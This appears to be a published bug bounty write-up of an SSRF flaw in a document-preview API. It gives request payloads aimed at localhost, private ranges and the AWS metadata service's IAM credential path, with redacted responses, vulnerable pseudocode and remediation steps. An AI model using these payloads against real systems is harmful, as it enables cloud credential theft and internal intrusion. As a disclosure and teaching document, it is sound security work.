# Server-Side Request Forgery (SSRF) — Internal Metadata Service Access via URL Parameter

**Vulnerability Type:** Server-Side Request Forgery (SSRF)
**Severity:** High (CVSS 3.1 Score: 8.6)
**Platform:** Bug Bounty (Redacted)
**Status:** Resolved / Disclosed
**Date:** 2024

---

## Summary

A Server-Side Request Forgery (SSRF) vulnerability was identified in a web application's document preview feature. The application accepted a user-supplied URL and fetched the remote resource server-side without validating the destination. By supplying internal IP addresses and cloud metadata endpoints as the URL value, I was able to make the server send requests to internal infrastructure — including the AWS EC2 instance metadata service at `169.254.169.254` — potentially exposing cloud credentials and internal network topology.

---

## Vulnerability Details

| Field | Details |
|---|---|
| Type | SSRF — Cloud Metadata + Internal Network Access |
| Endpoint | `POST /api/v1/preview` — `url` parameter |
| Internal Target | `http://169.254.169.254/latest/meta-data/` |
| Authentication Required | Yes |
| Impact | Cloud credential exposure, internal network scanning |
| CVSS Vector | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N |

---

## Background: What Is SSRF?

In an SSRF attack, the attacker tricks the server into making HTTP requests on their behalf. Instead of the attacker's browser sending the request, the **server** sends it — which means:

- Requests appear to come from a trusted internal IP
- Firewalls and security groups that block external access may allow internal requests
- Cloud provider metadata services (accessible only from within the instance) become reachable

---

## Steps to Reproduce

### 1. Identify the vulnerable feature

The application offered a "Preview Document from URL" feature — designed to fetch publicly hosted PDFs or images for display. The request looked like:

```
POST /api/v1/preview HTTP/1.1
Host: redacted.com
Content-Type: application/json
Authorization: Bearer [token]

{
  "url": "https://example.com/sample.pdf"
}
```

The server fetched the document and returned a preview. Normal functionality.

### 2. Test with an internal IP

Replace the URL with an internal address to check if the server blocks it:

```json
{ "url": "http://127.0.0.1/" }
```

**Response:**

```json
{
  "content": "<!DOCTYPE html><html>... [internal server homepage HTML] ..."
}
```

The server fetched its own localhost and returned the content — confirming SSRF.

### 3. Target the AWS metadata service

Replace with the AWS EC2 Instance Metadata Service (IMDS) address — a link-local address only accessible from within the EC2 instance:

```json
{ "url": "http://169.254.169.254/latest/meta-data/" }
```

**Response:**

```
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
hostname
iam/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
network/
placement/
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
```

The server returned the full metadata directory listing.

### 4. Retrieve IAM credentials

Navigate deeper into the IAM path to retrieve temporary AWS credentials:

```json
{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
```

**Response:**

```
app-production-role
```

```json
{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/app-production-role" }
```

**Response:**

```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...[REDACTED]",
  "SecretAccessKey": "[REDACTED]",
  "Token": "[REDACTED]",
  "Expiration": "2024-08-01T14:32:00Z"
}
```

**I stopped here immediately and reported.** I did not use these credentials for any action. The report included this response as a redacted screenshot.

### 5. Internal network scanning (demonstrated in report)

Using the same endpoint with RFC 1918 addresses showed the ability to map internal services:

```json
{ "url": "http://10.0.0.1/" }
{ "url": "http://192.168.1.1/" }
```

Both returned responses, confirming the server could reach internal network segments.

---

## Impact

- **Cloud credential theft** — Temporary IAM credentials could be used to access S3 buckets, EC2 instances, RDS databases, and other AWS resources
- **Internal network reconnaissance** — Map internal IP ranges, discover services not exposed externally
- **Pivot to internal systems** — Access admin panels, databases, or CI/CD services only reachable internally
- **Data exfiltration** — Use cloud credentials to download sensitive data from S3
- **Full AWS account compromise** — If the IAM role had broad permissions

---

## Root Cause

The application fetched user-supplied URLs without any allowlist validation or network-level restriction:

```python
# Vulnerable pseudocode
import requests

@app.route('/api/v1/preview', methods=['POST'])
@require_auth
def preview():
    url = request.json.get('url')
    response = requests.get(url)  # No validation whatsoever
    return jsonify({"content": response.text})
```

No DNS rebinding protection, no IP range blocking, and no allowlist of acceptable domains.

---

## Remediation

1. **Implement a strict URL allowlist** — Only permit fetching from explicitly approved external domains. Reject everything else.
2. **Block internal IP ranges** — Before making any outbound request, resolve the hostname and reject requests targeting:
   - `127.0.0.0/8` (loopback)
   - `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` (RFC 1918 private)
   - `169.254.0.0/16` (link-local / AWS metadata)
   - `::1` (IPv6 loopback)
3. **Disable IMDSv1, enforce IMDSv2** — AWS IMDSv2 requires a session token obtained via a PUT request, which most SSRF attacks cannot replicate. Enable it via: `aws ec2 modify-instance-metadata-options --http-tokens required`
4. **Use a network egress proxy** — Route all outbound application requests through a proxy that enforces allowlists
5. **Least privilege IAM roles** — Ensure the EC2 instance role has only the minimum permissions needed, limiting the blast radius of credential theft

---

## References

- [PortSwigger — SSRF](https://portswigger.net/web-security/ssrf)
- [OWASP — SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [HackTricks — SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
- [AWS — IMDSv2 Migration Guide](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [OWASP Top 10 — A10: Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)

---

*This writeup is published for educational purposes. All testing was conducted within an authorized bug bounty program. Retrieved credentials were immediately redacted and reported. No AWS actions were performed using the obtained credentials.*
